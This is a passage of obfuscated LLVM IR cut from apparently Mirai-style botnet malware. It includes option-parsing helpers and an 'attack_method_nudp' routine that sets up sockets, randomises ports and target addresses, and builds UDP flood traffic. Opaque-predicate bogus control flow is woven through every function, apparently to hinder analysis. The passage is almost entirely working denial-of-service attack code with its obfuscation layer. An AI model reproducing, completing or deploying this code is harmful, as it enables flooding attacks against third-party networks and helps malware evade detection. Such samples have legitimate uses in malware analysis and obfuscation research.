  %95 = load i32, i32* @y.12
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %93, label %102, label %125

; <label>:102:                                    ; preds = %originalBBpart216
  %103 = load i32, i32* @x.11
  %104 = load i32, i32* @y.12
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %102
  %111 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %112 = load i32, i32* %13, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %111, i64 %113
  %115 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %114, i32 0, i32 0
  %116 = load i8*, i8** %115, align 8
  call void @free(i8* %116) #7
  %117 = load i32, i32* @x.11
  %118 = load i32, i32* @y.12
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %125

; <label>:125:                                    ; preds = %originalBBpart220, %originalBBpart216
  br label %126

; <label>:126:                                    ; preds = %125
  %127 = load i32, i32* %13, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %13, align 4
  br label %58

; <label>:129:                                    ; preds = %originalBBpart212
  %130 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %131 = bitcast %struct.attack_option* %130 to i8*
  call void @free(i8* %131) #7
  br label %132

; <label>:132:                                    ; preds = %129, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %133 = alloca %struct.attack_option*, align 8
  %134 = alloca i32, align 4
  %135 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %133, align 8
  store i32 %1, i32* %134, align 4
  %136 = load %struct.attack_option*, %struct.attack_option** %133, align 8
  %137 = icmp eq %struct.attack_option* %136, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %41
  store i32 0, i32* %13, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %58
  %138 = load i32, i32* %13, align 4
  %139 = load i32, i32* %12, align 4
  %140 = icmp slt i32 %138, %139
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %78
  %141 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %142 = load i32, i32* %13, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %144, i32 0, i32 0
  %146 = load i8*, i8** %145, align 8
  %147 = icmp ne i8* %146, null
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %102
  %148 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %149 = load i32, i32* %13, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %151, i32 0, i32 0
  %153 = load i8*, i8** %152, align 8
  call void @free(i8* %153) #7
  br label %originalBB18
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11

; <label>:38:                                     ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

; <label>:40:                                     ; preds = %38, %27
  %41 = load i32, i32* @x.13
  %42 = load i32, i32* @y.14
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %40
  %49 = load i8*, i8** %5, align 8
  %50 = load i32, i32* @x.13
  %51 = load i32, i32* @y.14
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %49

originalBBalteredBB:                              ; preds = %originalBB, %40
  %58 = load i8*, i8** %5, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = load i32, i32* @x.15
  %6 = load i32, i32* @y.16
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca %struct.attack_option*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  store i8 %0, i8* %14, align 1
  store %struct.attack_option* %1, %struct.attack_option** %15, align 8
  store i8 %2, i8* %16, align 1
  store i32 %3, i32* %17, align 4
  %19 = load i8, i8* %14, align 1
  %20 = load %struct.attack_option*, %struct.attack_option** %15, align 8
  %21 = load i8, i8* %16, align 1
  %22 = call i8* @attack_get_opt_str(i8 zeroext %19, %struct.attack_option* %20, i8 zeroext %21, i8* null)
  store i8* %22, i8** %18, align 8
  %23 = load i8*, i8** %18, align 8
  %24 = icmp eq i8* %23, null
  %25 = load i32, i32* @x.15
  %26 = load i32, i32* @y.16
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %51

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.15
  %35 = load i32, i32* @y.16
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* %17, align 4
  store i32 %42, i32* %13, align 4
  %43 = load i32, i32* @x.15
  %44 = load i32, i32* @y.16
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %54

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i8*, i8** %18, align 8
  %53 = call i32 @util_atoi(i8* %52, i32 10)
  store i32 %53, i32* %13, align 4
  br label %54

; <label>:54:                                     ; preds = %51, %originalBBpart24
  %55 = load i32, i32* @x.15
  %56 = load i32, i32* @y.16
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load i32, i32* %13, align 4
  %64 = load i32, i32* @x.15
  %65 = load i32, i32* @y.16
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %63

originalBBalteredBB:                              ; preds = %originalBB, %4
  %72 = alloca i32, align 4
  %73 = alloca i8, align 1
  %74 = alloca %struct.attack_option*, align 8
  %75 = alloca i8, align 1
  %76 = alloca i32, align 4
  %77 = alloca i8*, align 8
  store i8 %0, i8* %73, align 1
  store %struct.attack_option* %1, %struct.attack_option** %74, align 8
  store i8 %2, i8* %75, align 1
  store i32 %3, i32* %76, align 4
  %78 = load i8, i8* %73, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %74, align 8
  %80 = load i8, i8* %75, align 1
  %81 = call i8* @attack_get_opt_str(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext %80, i8* null)
  store i8* %81, i8** %77, align 8
  %82 = load i8*, i8** %77, align 8
  %83 = icmp eq i8* %82, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %84 = load i32, i32* %17, align 4
  store i32 %84, i32* %13, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %85 = load i32, i32* %13, align 4
  br label %originalBB6
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #7
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_nudp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.19
  %6 = load i32, i32* @y.20
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca [22 x i8*], align 16
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i32*, align 8
  %21 = alloca i16, align 2
  %22 = alloca i16, align 2
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %31 = getelementptr inbounds [22 x i8*], [22 x i8*]* %17, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i8** %31, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = call signext i8 @random_hex()
  %34 = sext i8 %33 to i32
  %35 = call signext i8 @random_hex()
  %36 = sext i8 %35 to i32
  %37 = add nsw i32 %34, %36
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i32 0, i32 0), i64 %38
  store i8* %39, i8** %32, align 8
  %40 = getelementptr inbounds i8*, i8** %32, i64 1
  %41 = call signext i8 @random_hex()
  %42 = sext i8 %41 to i32
  %43 = call signext i8 @random_hex()
  %44 = sext i8 %43 to i32
  %45 = add nsw i32 %42, %44
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i64 %46
  store i8* %47, i8** %40, align 8
  %48 = getelementptr inbounds i8*, i8** %40, i64 1
  store i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i32 0, i32 0), i8** %48, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  store i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i32 0, i32 0), i8** %49, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i8** %50, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = call signext i8 @random_hex()
  %53 = sext i8 %52 to i32
  %54 = call signext i8 @random_hex()
  %55 = sext i8 %54 to i32
  %56 = add nsw i32 %53, %55
  %57 = call signext i8 @random_hex()
  %58 = sext i8 %57 to i32
  %59 = add nsw i32 %56, %58
  %60 = call signext i8 @random_hex()
  %61 = sext i8 %60 to i32
  %62 = add nsw i32 %59, %61
  %63 = call signext i8 @random_hex()
  %64 = sext i8 %63 to i32
  %65 = add nsw i32 %62, %64
  %66 = call signext i8 @random_hex()
  %67 = sext i8 %66 to i32
  %68 = add nsw i32 %65, %67
  %69 = call signext i8 @random_hex()
  %70 = sext i8 %69 to i32
  %71 = add nsw i32 %68, %70
  %72 = call signext i8 @random_hex()
  %73 = sext i8 %72 to i32
  %74 = add nsw i32 %71, %73
  %75 = call signext i8 @random_hex()
  %76 = sext i8 %75 to i32
  %77 = add nsw i32 %74, %76
  %78 = call signext i8 @random_hex()
  %79 = sext i8 %78 to i32
  %80 = add nsw i32 %77, %79
  %81 = call signext i8 @random_hex()
  %82 = sext i8 %81 to i32
  %83 = add nsw i32 %80, %82
  %84 = call signext i8 @random_hex()
  %85 = sext i8 %84 to i32
  %86 = add nsw i32 %83, %85
  %87 = call signext i8 @random_hex()
  %88 = sext i8 %87 to i32
  %89 = add nsw i32 %86, %88
  %90 = call signext i8 @random_hex()
  %91 = sext i8 %90 to i32
  %92 = add nsw i32 %89, %91
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.6, i32 0, i32 0), i64 %93
  store i8* %94, i8** %51, align 8
  %95 = getelementptr inbounds i8*, i8** %51, i64 1
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i32 0, i32 0), i8** %95, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 1
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8** %96, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 1
  store i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i32 0, i32 0), i8** %97, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  store i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i32 0, i32 0), i8** %98, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 1
  store i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i32 0, i32 0), i8** %99, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  store i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i32 0, i32 0), i8** %100, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 1
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i32 0, i32 0), i8** %101, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i32 0, i32 0), i8** %102, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 1
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8** %103, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 1
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8** %104, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i32 0, i32 0), i8** %105, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 1
  store i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i32 0, i32 0), i8** %106, align 8
  %107 = getelementptr inbounds i8*, i8** %106, i64 1
  store i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i32 0, i32 0), i8** %107, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 1
  store i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8** %108, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 1
  store i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i32 0, i32 0), i8** %109, align 8
  %110 = load i8, i8* %13, align 1
  %111 = zext i8 %110 to i64
  %112 = call noalias i8* @calloc(i64 %111, i64 8) #7
  %113 = bitcast i8* %112 to i8**
  store i8** %113, i8*** %19, align 8
  %114 = load i8, i8* %13, align 1
  %115 = zext i8 %114 to i64
  %116 = call noalias i8* @calloc(i64 %115, i64 4) #7
  %117 = bitcast i8* %116 to i32*
  store i32* %117, i32** %20, align 8
  %118 = load i8, i8* %15, align 1
  %119 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %120 = call i32 @attack_get_opt_int(i8 zeroext %118, %struct.attack_option* %119, i8 zeroext 7, i32 65535)
  %121 = trunc i32 %120 to i16
  store i16 %121, i16* %21, align 2
  %122 = load i8, i8* %15, align 1
  %123 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %124 = call i32 @attack_get_opt_int(i8 zeroext %122, %struct.attack_option* %123, i8 zeroext 6, i32 65535)
  %125 = trunc i32 %124 to i16
  store i16 %125, i16* %22, align 2
  %126 = load i8, i8* %15, align 1
  %127 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %128 = call i32 @attack_get_opt_int(i8 zeroext %126, %struct.attack_option* %127, i8 zeroext 0, i32 1024)
  %129 = trunc i32 %128 to i16
  store i16 %129, i16* %23, align 2
  %130 = load i8, i8* %15, align 1
  %131 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %132 = call i32 @attack_get_opt_int(i8 zeroext %130, %struct.attack_option* %131, i8 zeroext 1, i32 1)
  %133 = trunc i32 %132 to i8
  store i8 %133, i8* %24, align 1
  %134 = bitcast %struct.sockaddr_in* %25 to i8*
  call void @llvm.memset.p0i8.i64(i8* %134, i8 0, i64 16, i32 4, i1 false)
  %135 = load i16, i16* %22, align 2
  %136 = zext i16 %135 to i32
  %137 = icmp eq i32 %136, 65535
  %138 = load i32, i32* @x.19
  %139 = load i32, i32* @y.20
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %137, label %146, label %149

; <label>:146:                                    ; preds = %originalBBpart2
  %147 = call i32 @rand_next()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %22, align 2
  br label %152

; <label>:149:                                    ; preds = %originalBBpart2
  %150 = load i16, i16* %22, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #8
  store i16 %151, i16* %22, align 2
  br label %152

; <label>:152:                                    ; preds = %149, %146
  store i32 0, i32* %18, align 4
  br label %153

; <label>:153:                                    ; preds = %originalBBpart2135, %152
  %154 = load i32, i32* @x.19
  %155 = load i32, i32* @y.20
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %153
  %162 = load i32, i32* %18, align 4
  %163 = load i8, i8* %13, align 1
  %164 = zext i8 %163 to i32
  %165 = icmp slt i32 %162, %164
  %166 = load i32, i32* @x.19
  %167 = load i32, i32* @y.20
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %165, label %174, label %316

; <label>:174:                                    ; preds = %originalBBpart2116
  %175 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %176 = load i8**, i8*** %19, align 8
  %177 = load i32, i32* %18, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8*, i8** %176, i64 %178
  store i8* %175, i8** %179, align 8
  %180 = load i16, i16* %21, align 2
  %181 = zext i16 %180 to i32
  %182 = icmp eq i32 %181, 65535
  br i1 %182, label %183, label %192

; <label>:183:                                    ; preds = %174
  %184 = call i32 @rand_next()
  %185 = trunc i32 %184 to i16
  %186 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %187 = load i32, i32* %18, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 0
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %190, i32 0, i32 1
  store i16 %185, i16* %191, align 2
  br label %201

; <label>:192:                                    ; preds = %174
  %193 = load i16, i16* %21, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #8
  %195 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %196 = load i32, i32* %18, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i64 %197
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i32 0, i32 0
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %199, i32 0, i32 1
  store i16 %194, i16* %200, align 2
  br label %201

; <label>:201:                                    ; preds = %192, %183
  %202 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %203 = load i32*, i32** %20, align 8
  %204 = load i32, i32* %18, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds i32, i32* %203, i64 %205
  store i32 %202, i32* %206, align 4
  %207 = icmp eq i32 %202, -1
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %201
  ret void

; <label>:209:                                    ; preds = %201
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 0
  store i16 2, i16* %210, align 4
  %211 = load i16, i16* %22, align 2
  %212 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 1
  store i16 %211, i16* %212, align 2
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %25, i32 0, i32 2
  %214 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %213, i32 0, i32 0
  store i32 0, i32* %214, align 4
  %215 = load i32*, i32** %20, align 8
  %216 = load i32, i32* %18, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i32, i32* %215, i64 %217
  %219 = load i32, i32* %218, align 4
  %220 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %221 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  store %struct.sockaddr* %221, %struct.sockaddr** %220, align 8
  %222 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %223 = load %struct.sockaddr*, %struct.sockaddr** %222, align 8
  %224 = call i32 @bind(i32 %219, %struct.sockaddr* %223, i32 16) #7
  %225 = icmp eq i32 %224, -1
  br i1 %225, label %226, label %243

; <label>:226:                                    ; preds = %209
  %227 = load i32, i32* @x.19
  %228 = load i32, i32* @y.20
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %226
  %235 = load i32, i32* @x.19
  %236 = load i32, i32* @y.20
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %243

; <label>:243:                                    ; preds = %originalBBpart2120, %209
  %244 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %245 = load i32, i32* %18, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %244, i64 %246
  %248 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i32 0, i32 2
  %249 = load i8, i8* %248, align 4
  %250 = zext i8 %249 to i32
  %251 = icmp slt i32 %250, 32
  br i1 %251, label %252, label %278

; <label>:252:                                    ; preds = %243
  %253 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %254 = load i32, i32* %18, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i32 0, i32 1
  %258 = load i32, i32* %257, align 4
  %259 = call i32 @ntohl(i32 %258) #8
  %260 = call i32 @rand_next()
  %261 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %262 = load i32, i32* %18, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %261, i64 %263
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %264, i32 0, i32 2
  %266 = load i8, i8* %265, align 4
  %267 = zext i8 %266 to i32
  %268 = lshr i32 %260, %267
  %269 = add i32 %259, %268
  %270 = call i32 @htonl(i32 %269) #8
  %271 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %272 = load i32, i32* %18, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %273
